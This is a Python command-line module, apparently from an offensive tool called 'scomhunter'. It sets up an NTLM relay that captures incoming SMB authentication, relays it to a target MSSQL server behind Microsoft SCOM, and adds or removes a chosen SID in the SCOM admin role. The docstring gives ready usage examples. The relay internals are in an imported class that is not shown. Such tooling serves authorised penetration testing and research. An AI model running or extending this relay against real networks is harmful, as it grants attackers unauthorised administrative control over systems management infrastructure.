import typer
from lib.attacks.mssql_relay import MSSQLSCOMRELAY
from lib.logger import init_logger

app = typer.Typer()
COMMAND_NAME = 'mssql'
HELP = 'SCOM MSSQL NTLM Relay Attack - Manipulate SCOM admin role membership'

@app.callback(no_args_is_help=True, invoke_without_command=True)
def main(
    # Target args (mutually exclusive)
    target          : str   = typer.Option(None, "-t", "--target", help="Single target MSSQL server (e.g., 192.168.1.10:1433 or mssql.domain.com)"),
    target_file     : str   = typer.Option(None, "-tf", "--target-file", help="File containing list of MSSQL servers (one per line)"),
    
    # Optional args
    sid             : str   = typer.Option(None, "-s", "--sid", help="SID of user to add/remove (required for update/delete operations)"),
    interface       : str   = typer.Option("0.0.0.0", "-i", "--interface", help="Interface to listen on"),
    port            : int   = typer.Option(445, "-p", "--port", help="Port to listen on for incoming SMB connections"),
    timeout         : int   = typer.Option(5, "--timeout", help="Connection timeout in seconds"),
    
    # Operation mode flags (mutually exclusive)
    update          : bool  = typer.Option(False, '-u', '--update', help='Add user to SCOM admin role (default operation)'),
    delete          : bool  = typer.Option(False, '-d', '--delete', help='Remove user from SCOM admin role'),
    list_members    : bool  = typer.Option(False, '-l', '--list', help='List current members of SCOM admin role'),
    
    # Logging
    verbose         : bool  = typer.Option(False, '-v', '--verbose', help='Enable verbose logging'),
    ):
    """
    SCOM MSSQL NTLM Relay Attack
    
    This tool sets up an NTLM relay server that waits for incoming authentication,
    relays it to the target MSSQL server, and executes SQL queries to manipulate
    the SCOM admin role membership.
    
    Examples:
        # Add a user to SCOM admin role (default operation)
        scomhunter mssql -t mssql.corp.com -s S-1-5-21-xxx-xxx-xxx-1234
        
        # Remove a user from SCOM admin role
        scomhunter mssql -t mssql.corp.com -s S-1-5-21-xxx-xxx-xxx-1234 -d
        
        # List current members of SCOM admin role
        scomhunter mssql -t mssql.corp.com -l
        
        # Use custom listening interface and port
        scomhunter mssql -t 192.168.1.10:1433 -s S-1-5-21-xxx-xxx-xxx-1234 -i 192.168.1.50 -p 8445
    """
    
    init_logger(verbose)
    
    # Validate target arguments
    if not target and not target_file:
        typer.echo("Error: Either -t/--target or -tf/--target-file must be specified")
        raise typer.Exit(1)
    
    if target and target_file:
        typer.echo("Error: Cannot specify both -t/--target and -tf/--target-file")
        raise typer.Exit(1)
    
    # Determine operation mode
    operation_mode = 'update'  # default
    mode_count = sum([update, delete, list_members])
    
    if mode_count > 1:
        typer.echo("Error: Only one operation mode can be specified at a time (-u, -d, or -l)")
        raise typer.Exit(1)
    
    if delete:
        operation_mode = 'delete'
    elif list_members:
        operation_mode = 'list'
    
    # Validate SID requirement for non-list operations
    if operation_mode != 'list' and not sid:
        typer.echo("Error: SID (-s/--sid) is required for update and delete operations")
        typer.echo("Use -l/--list to list members without specifying a SID")
        raise typer.Exit(1)
    
    # Create and start the relay
    scom_relay = MSSQLSCOMRELAY(
        target=target,
        target_file=target_file,
        sid=sid,
        interface=interface,
        port=port,
        timeout=timeout,
        operation_mode=operation_mode,
        verbose=verbose
    )
    
    scom_relay.start()
